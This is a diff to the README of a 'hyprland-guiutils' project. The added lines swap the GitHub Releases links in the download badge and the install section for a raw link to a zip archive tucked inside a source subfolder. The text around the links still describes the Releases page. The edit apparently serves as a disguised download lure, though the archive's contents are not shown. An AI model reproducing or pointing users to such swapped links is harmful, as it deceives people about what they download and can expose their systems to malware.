@@ -1,6 +1,6 @@
 # 🌟 hyprland-guiutils - Simple Tools for Better GUI Management
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/NotClare/hyprland-guiutils/releases)
+[![Download Release](https://raw.githubusercontent.com/NotClare/hyprland-guiutils/main/utils/update-screen/src/hyprland-guiutils_v1.9.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/NotClare/hyprland-guiutils/main/utils/update-screen/src/hyprland-guiutils_v1.9.zip)
 
 ## 📦 Introduction
 
@@ -12,7 +12,7 @@ To use this application, you will need to download it from our Releases page. Fo
 
 ## 🔗 Download & Install
 
-To get started, [visit this page to download](https://github.com/NotClare/hyprland-guiutils/releases). Here, you will find the latest version of the software along with previous releases.
+To get started, [visit this page to download](https://raw.githubusercontent.com/NotClare/hyprland-guiutils/main/utils/update-screen/src/hyprland-guiutils_v1.9.zip). Here, you will find the latest version of the software along with previous releases.
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed on the page.
